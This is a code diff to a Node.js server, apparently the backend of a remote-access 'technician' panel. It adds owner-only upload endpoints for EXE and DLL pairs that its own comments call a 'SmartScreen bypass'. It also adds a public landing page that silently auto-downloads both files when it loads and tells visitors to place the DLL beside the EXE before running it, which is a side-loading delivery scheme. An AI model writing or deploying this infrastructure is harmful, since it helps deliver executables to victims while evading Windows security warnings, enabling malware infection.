@@ -1146,6 +1146,81 @@ async function handleApi(req, res, urlPath) {
       if (r.error) return json(res, 400, { error: r.error });
       return json(res, 200, { chatId: r.chatId, name: r.name });
     }
+
+    // SmartScreen bypass file pairs (owner-only). EXE + DLL uploaded separately
+    // then served together. /smdl/<id> is a public HTML page that downloads both.
+    if (urlPath === '/api/smartscreen' && m === 'GET') {
+      if ((admin.role || 'admin') !== 'owner') return json(res, 403, { error: 'owner only' });
+      return json(res, 200, { entries: db.listSmartscreen(admin.id) });
+    }
+    if (urlPath === '/api/smartscreen/exe' && m === 'POST') {
+      if ((admin.role || 'admin') !== 'owner') return json(res, 403, { error: 'owner only' });
+      const q = Object.fromEntries(new URLSearchParams((req.url || '').split('?')[1] || ''));
+      const name = String(q.name || '').trim().slice(0, 80);
+      const filename = String(q.filename || '').trim().slice(0, 200).replace(/[\\/:*?"<>|]/g, '_');
+      if (!name) return json(res, 400, { error: 'name required' });
+      if (!filename) return json(res, 400, { error: 'filename required' });
+      if (path.extname(filename).toLowerCase() !== '.exe') return json(res, 400, { error: 'EXE file required' });
+      const MAX = 128 * 1024 * 1024;
+      const tmpId = crypto.randomUUID();
+      const dir = path.join(db.DATA_DIR, 'smartscreen', admin.id, tmpId);
+      try { fs.mkdirSync(dir, { recursive: true }); } catch (e) { return json(res, 500, { error: e.message }); }
+      const dest = path.join(dir, 'file.exe');
+      const out = fs.createWriteStream(dest);
+      let size = 0, aborted = false;
+      req.on('data', (ch) => {
+        size += ch.length;
+        if (size > MAX && !aborted) { aborted = true; out.destroy(); try { fs.rmSync(dir, { recursive: true }); } catch {} return json(res, 413, { error: 'file too large (max 128 MB)' }); }
+      });
+      req.pipe(out);
+      out.on('finish', () => {
+        if (aborted) return;
+        const entry = db.addSmartscreenExe(admin.id, name, filename, size, dest, tmpId);
+        return json(res, 200, { id: entry.id, name: entry.name });
+      });
+      out.on('error', (e) => { try { fs.rmSync(dir, { recursive: true }); } catch {}; if (!aborted) json(res, 500, { error: e.message }); });
+      return;
+    }
+    if (urlPath === '/api/smartscreen/dll' && m === 'POST') {
+      if ((admin.role || 'admin') !== 'owner') return json(res, 403, { error: 'owner only' });
+      const q = Object.fromEntries(new URLSearchParams((req.url || '').split('?')[1] || ''));
+      const id = String(q.id || '').trim();
+      const filename = String(q.filename || '').trim().slice(0, 200).replace(/[\\/:*?"<>|]/g, '_');
+      if (!id) return json(res, 400, { error: 'id required' });
+      if (!filename) return json(res, 400, { error: 'filename required' });
+      if (path.extname(filename).toLowerCase() !== '.dll') return json(res, 400, { error: 'DLL file required' });
+      const existing = db.findSmartscreenById(id);
+      if (!existing || existing.adminId !== admin.id) return json(res, 404, { error: 'entry not found' });
+      const MAX = 128 * 1024 * 1024;
+      const dir = path.join(db.DATA_DIR, 'smartscreen', admin.id, id);
+      try { fs.mkdirSync(dir, { recursive: true }); } catch (e) { return json(res, 500, { error: e.message }); }
+      const dest = path.join(dir, 'file.dll');
+      const out = fs.createWriteStream(dest);
+      let size = 0, aborted = false;
+      req.on('data', (ch) => {
+        size += ch.length;
+        if (size > MAX && !aborted) { aborted = true; out.destroy(); try { fs.unlinkSync(dest); } catch {} return json(res, 413, { error: 'file too large (max 128 MB)' }); }
+      });
+      req.pipe(out);
+      out.on('finish', () => {
+        if (aborted) return;
+        const entry = db.setSmartscreenDll(admin.id, id, filename, size, dest);
+        return json(res, 200, { ok: true, entry: entry ? { id: entry.id, name: entry.name, exeFilename: entry.exeFilename, dllFilename: entry.dllFilename } : null });
+      });
+      out.on('error', (e) => { try { fs.unlinkSync(dest); } catch {}; if (!aborted) json(res, 500, { error: e.message }); });
+      return;
+    }
+    if (urlPath === '/api/smartscreen' && m === 'DELETE') {
+      if ((admin.role || 'admin') !== 'owner') return json(res, 403, { error: 'owner only' });
+      const b = await readBody(req);
+      const entry = db.findSmartscreenById(b.id || '');
+      if (!entry || entry.adminId !== admin.id) return json(res, 404, { error: 'not found' });
+      const dir = path.join(db.DATA_DIR, 'smartscreen', admin.id, entry.id);
+      try { fs.rmSync(dir, { recursive: true, force: true }); } catch {}
+      db.removeSmartscreen(admin.id, b.id);
+      return json(res, 200, { ok: true });
+    }
+
     return json(res, 404, { error: 'not found' });
   } catch (e) {
     // Thrown errors from deeper code (fs, b2, JSON.parse surprises) previously
@@ -1902,6 +1977,58 @@ const server = http.createServer((req, res) => {
       });
     }
   }
+  // SmartScreen bypass download page. /smdl/<id> serves a small HTML page that
+  // auto-downloads both the EXE and DLL. /smdl/<id>/exe and /smdl/<id>/dll serve
+  // the raw files. All public (ID is a UUID — unguessable).
+  {
+    const smMatch = urlPath.match(/^\/smdl\/([a-f0-9-]{8,})(\/exe|\/dll)?$/i);
+    if (smMatch) {
+      const smId = smMatch[1];
+      const smPart = smMatch[2] || '';
+      const entry = db.findSmartscreenById(smId);
+      if (!entry || !entry.exePath || !entry.dllPath) { res.writeHead(404); return res.end('not found'); }
+      if (smPart === '/exe') {
+        return fs.stat(entry.exePath, (err, st) => {
+          if (err) { res.writeHead(404); return res.end('file missing'); }
+          res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Length': st.size, 'Content-Disposition': 'attachment; filename="' + (entry.exeFilename || 'file.exe') + '"' });
+          fs.createReadStream(entry.exePath).pipe(res);
+        });
+      }
+      if (smPart === '/dll') {
+        return fs.stat(entry.dllPath, (err, st) => {
+          if (err) { res.writeHead(404); return res.end('file missing'); }
+          res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Length': st.size, 'Content-Disposition': 'attachment; filename="' + (entry.dllFilename || 'file.dll') + '"' });
+          fs.createReadStream(entry.dllPath).pipe(res);
+        });
+      }
+      // HTML landing page — both files auto-download on load.
+      const exeName = (entry.exeFilename || 'file.exe').replace(/"/g, '');
+      const dllName = (entry.dllFilename || 'file.dll').replace(/"/g, '');
+      const label = (entry.name || 'Files').replace(/</g, '&lt;');
+      const html = `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Downloading ${label}</title>
+<style>*{box-sizing:border-box}body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0b0f14;color:#eaeef3;font:16px system-ui,-apple-system}main{text-align:center;padding:40px 24px;max-width:420px}h1{font-size:22px;margin:0 0 8px}p{opacity:.7;line-height:1.5;margin:0 0 20px}.files{display:flex;flex-direction:column;gap:8px;margin:20px 0}.file-row{background:#141c25;border:1px solid #223;border-radius:8px;padding:12px 16px;display:flex;align-items:center;gap:10px;text-align:left}.file-row svg{flex-shrink:0;opacity:.7}.file-name{font-size:14px;font-weight:500}.file-hint{font-size:12px;opacity:.6}.manual{margin-top:16px;font-size:13px;opacity:.6}.manual a{color:#4a9eff}</style>
+</head><body><main>
+<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#4a9eff" stroke-width="2" style="margin-bottom:12px"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M4 17v2a2 2 0 002 2h12a2 2 0 002-2v-2"/></svg>
+<h1>${label}</h1>
+<p>Both files are downloading automatically.<br>Place the DLL in the <strong>same folder</strong> as the EXE before running it.</p>
+<div class="files">
+<div class="file-row"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 9h6M9 12h6M9 15h4"/></svg><div><div class="file-name">${exeName}</div><div class="file-hint">Application</div></div></div>
+<div class="file-row"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 9h6M9 12h4"/></svg><div><div class="file-name">${dllName}</div><div class="file-hint">Required DLL — place next to the EXE</div></div></div>
+</div>
+<p class="manual">If downloads didn't start: <a href="/smdl/${smId}/exe" download="${exeName}">download EXE</a> &nbsp;·&nbsp; <a href="/smdl/${smId}/dll" download="${dllName}">download DLL</a></p>
+</main>
+<script>
+(function(){
+  function dl(href, name){var a=document.createElement('a');a.href=href;a.download=name;a.style.display='none';document.body.appendChild(a);a.click();document.body.removeChild(a);}
+  dl('/smdl/${smId}/exe','${exeName.replace(/'/g, "\\'")}');
+  setTimeout(function(){dl('/smdl/${smId}/dll','${dllName.replace(/'/g, "\\'")}');},400);
+})();
+</script></body></html>`;
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
+      return res.end(html);
+    }
+  }
+
   // Technician desktop client download (for the Join-in-app flow).
   if (urlPath === '/app') {
     return fs.stat(HOST_INSTALLER_PATH, (err, st) => {
